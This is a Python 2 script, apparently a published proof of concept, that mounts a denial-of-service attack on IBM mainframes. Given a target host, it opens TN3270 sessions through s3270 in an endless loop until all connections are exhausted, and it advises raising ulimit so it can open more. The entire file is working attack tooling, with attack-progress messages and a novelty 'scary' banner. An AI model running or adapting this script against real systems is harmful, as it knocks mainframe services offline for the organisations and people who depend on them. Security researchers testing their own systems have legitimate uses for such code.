#!/usr/bin/env python

##################################################################
# Script to connect to all available 3270 connections		 #
#                                                                #
# Requirements: Python, s3270 			                 #
# Created by: Soldier of Fortran (@mainframed767)                #
# Usage: For a hostname[:port] uses up all available connections #
#                                                                #
# Copyright GPL 2012                                             #
##################################################################

from py3270 import EmulatorBase
import time #needed for sleep
import sys 
import signal
import argparse #needed for argument parsing
import platform #needed for OS check

from blessings import Terminal
t = Terminal()

if platform.system() == 'Darwin': #'Darwin'
	class Emulator(EmulatorBase):
		s3270_executable = 'MAC_Binaries/s3270'
elif platform.system() == 'Linux':
	class Emulator(EmulatorBase):
		s3270_executable = '/usr/bin/s3270' #this assumes s3270 is in your $PATH. If not then you'll have to change it
elif platform.system() == 'Windows':
	print "Sorry Windows isn't supported"

#start argument parser
parser = argparse.ArgumentParser(description='MF DoS - A PoC script to exhaust all TN3270 connections to a mainframe',epilog='Crash and Burn!')
parser.add_argument('-t','--target', help='target IP address/Hostname and port: TARGET[:PORT] default port is 23. Add L: for SSL enabled TN3270 hosts. E.G. L:192.168.0.1:3270',required=True,dest='target')
parser.add_argument('-s','--scary',help='Scary Ironic ASCII to impress your boss',default=False,dest='scary',action='store_true')
parser.add_argument('-v','--verbose',help='Be verbose',default=False,dest='verbose',action='store_true')

args = parser.parse_args()
results = parser.parse_args() # put the arg results in the variable results

print t.clear

print ""
if results.scary:
	#print scary logo 'ooh, ahh'
	print t.white_bold + """
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   """,
	print t.bright_green + t.bold + "BYE" + t.normal,
	print t.white_bold + "  `98v8P'  ",
	print t.bright_green + t.bold + "TSO" + t.normal,
	print t.white_bold + """     `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
	""" + t.normal
	print "                     ",

print t.red('Mainframe SNA Connection Exhauster')
print ""



if results.scary:
	#Begin fake connection screen for cool james bond look
	print t.white_bold + "Connecting to target", results.target,
	
	for y in xrange ( 10 ):
		print ".",
		sys.stdout.flush() 
		time.sleep(0.25)
	
	print t.white_bold + "[" + t.bright_green + "OK" + t.white_bold + "]" + t.normal
	
	print t.white_bold + "Charging TSO Superweapon ",
	
	for y in xrange ( 13 ):
		print ".",
		sys.stdout.flush() 
		time.sleep(0.25)
	
	print t.white_bold + "[" + t.bright_green + "OK" + t.white_bold + "]" + t.normal
	
print t.bold_red + "===> Attack underway ",
sys.stdout.flush() 
	
#Catch CTRL-C gracefully#######
def signal_handler(signal, frame):
	print t.bright_red + 'DONE!' + t.normal
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)
###############################

if results.verbose:
	print t.bold_white + "Total Connections:"
else:
	print ""

connections = 0
Down = 0
limit_reached = 0


###############################
# Begin Actual Attack
###############################
while True:
	if Down == 1:
		print ""
		print t.move_up + t.bold_green + "Mainframe down sleeping for 30 seconds" + t.normal
		time.sleep(30)
	if limit_reached == 1:
		print ""
		print t.move_up + t.bold_green + "Maximum sessions opened. If mainframe still up try increasing your your max connections with " + t.bold_white + "ulimit -n <number> " + t.bold_green + "(try ulimit -n 4096)" + t.normal
	try:
		em = Emulator()
		em.connect(results.target)
		connections = connections + 1
		if connections % 10 == 0 and results.verbose:
			print t.move_left + t.move_left + t.move_left + t.move_left + t.move_left + str(connections),
			sys.stdout.flush()
	except OSError:
		if limit_reached < 2:
			limit_reached = limit_reached + 1
	except Exception:
		if Down < 2:
			Down = Down + 1
	if not results.verbose:
		print t.bold_blue + t.move_left + t.move_left + "-", 
		sys.stdout.flush()
		time.sleep(0.05)
		print t.bold_blue +  t.move_left + t.move_left + "\\",
		sys.stdout.flush() 
		time.sleep(0.05)		
		print t.bold_blue +  t.move_left + t.move_left + "|",
		sys.stdout.flush()
		time.sleep(0.05)
		print t.bold_blue +  t.move_left + t.move_left + "/",  
		sys.stdout.flush()
		time.sleep(0.05)
		
		
